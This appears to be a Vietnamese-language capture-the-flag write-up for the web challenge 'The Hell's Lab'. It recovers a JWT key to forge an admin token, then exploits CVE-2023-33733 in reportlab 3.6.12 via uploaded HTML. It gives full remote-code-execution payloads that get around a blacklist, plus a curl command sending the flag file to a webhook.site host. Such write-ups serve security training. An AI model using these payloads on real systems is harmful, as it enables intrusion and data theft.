# WEB - The Hell's Lab - 1000 point
## Description:

At a Hell's Lab, the Admin is secretly building a tool without letting the employees know. As a spy for an organization X, investigate what that tool is?, can you hack into it?

Mission:  **LINK**

## Skills Required

 - Có kĩ năng đọc hiểu và debug Python
 - Có khả năng research lỗ hổng

## Application Overview

![!\[\[1.png\]\]](images/1.png)

## Analysis

Từ mã nguồn cho sẵn có thể thấy được một số thông tin sau:
![!\[\[2.png\]\]](images/2.png)

* `JWT_KEY` : chưa thể xác định.
* `is_admin(...)` : hàm này có thể yêu cầu xác thực admin để được dùng một số tính năng.

### 1. Find and Edit `JWT_KEY`

Ở trang web ta tìm được 2 thông tin từ file `script.js` vÀ `style.css`

Từ `style.css`:

![!\[\[3.png\]\]](images/3.png)

![!\[\[4.png\]\]](images/4.png)

![!\[\[5.png\]\]](images/5.png)

File `script.js` ta cần đăng kí và đăng nhập vào để tìm:

![!\[\[6.png\]\]](images/6.png)

![!\[\[7.png\]\]](images/7.png)

`=>` Có được password để mở pastebin

![!\[\[8.png\]\]](images/8.png)

`=>` Có được tất cả thông tin, giờ ta sẽ xác định Admin key

![!\[\[9.png\]\]](images/9.png)

`=>` Giờ ta đã có được Admin key, cũng như là `JWT_KEY`

Tiếp theo thay đổi `Payload` để trở thành Admin

![!\[\[10.png\]\]](images/10.png)

Sau đó là ta đã có thể vào đường dẫn `/convert`

![!\[\[11.png\]\]](images/11.png)

### 2. Exploit CVE-2023-33733

Giờ ta sẽ thử một số tính năng của app bằng cách upload một file được cho phép

![!\[\[15.png\]\]](images/15.png)

`=>` Có thể thấy được app này hỗ trợ convert file sang PDF - đây sẽ là vấn đề mà ta cần xem xét, mở mã nguồn kiểm tra xem thư viện nào đã được cài đặt.

Dựa vào thông tin thư viện được cài đặt ở file `requirements.txt` có thấy một thư viện
```
...
reportlab==3.6.12
...
```
Sau khi search thì ta tìm đươc một CVE liên quan

![!\[\[12.png\]\]](images/12.png)

Sau đó tử tạo một file `.html` từ PoC này để thử

![!\[\[13.png\]\]](images/13.png)

File `.html`
```html
<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font></para>
```

Sau khi upload lên thì xuất hiện lỗi

![!\[\[14.png\]\]](images/14.png)

`=>` Có lẽ thư viện xử lí đã được edit lại

Trong lúc build có một dòng lệnh
```Dockerfile
...
COPY libs/reportlab /usr/local/lib/python3.10/site-packages/reportlab
...
```
Thư viện gốc đã bị thay thế bởi thư viện được mod lại.

So sánh mã nguồn của 2 file `rl_safe_eval.py` của thư viện reportlab v3.6.12 và thư viện đã được mod

![!\[\[16.png\]\]](images/16.png)

`=>` Có thể thấy được bên trái là mã nguồn của thư viện và bên phải là mã nguồn của tác giả đã mod lại. Các từ như:
```
pow, ctype, iter, list, locals, map, max, min, next, pow, range, reversed, set, sorted, sum, system,...
```
Các từ này đã được đưa vào blacklist.

Vậy nên thay vì dùng: `pow` thì ta sẽ kiểm tra xem builtins nào không nằm trong black list thì chọn.

![!\[\[17.png\]\]](images/17.png)

`=>` Ở đây ta thấy `zip` không nằm trong blacklist thì ta sẽ dùng `zip`

Hơn nữa `system()` cũng bị đưa vào blacklist nên ta sẽ dùng một function khác là `popen('<command>').read()` để thay cho `system`

Lúc này payload mới sẽ là:
```html
<para>
    <font color="[ [ getattr(zip,Word('__globals__'))['os'].popen('curl https://onion.requestcatcher.com/hello').read() for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
      exploit
      </font>
  </para>
```

Gửi file này đi thì ta sẽ được kết quả:

![!\[\[18.png\]\]](images/18.png)

![!\[\[19.png\]\]](images/19.png)

Lúc này ta sẽ gửi file flag ra ngoài bằng lệnh:
```bash
curl -d @/`ls / |grep flag` https://webhook.site/44211d9a-cec0-489e-92c6-77327ff743da
```

Payload hoàn chỉnh:

```html
<para>
    <font color="[ [ getattr(zip,Word('__globals__'))['os'].popen('curl -d @/`ls / |grep flag` https://webhook.site/44211d9a-cec0-489e-92c6-77327ff743da').read() for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
      exploit
      </font>
  </para>
```

Kết quả trả về:

![!\[\[20.png\]\]](images/20.png)

### Flag: `FUSec{3asy_2_find_jwt_4nd_expl0it_ed1ted_CVE-2023-33733}`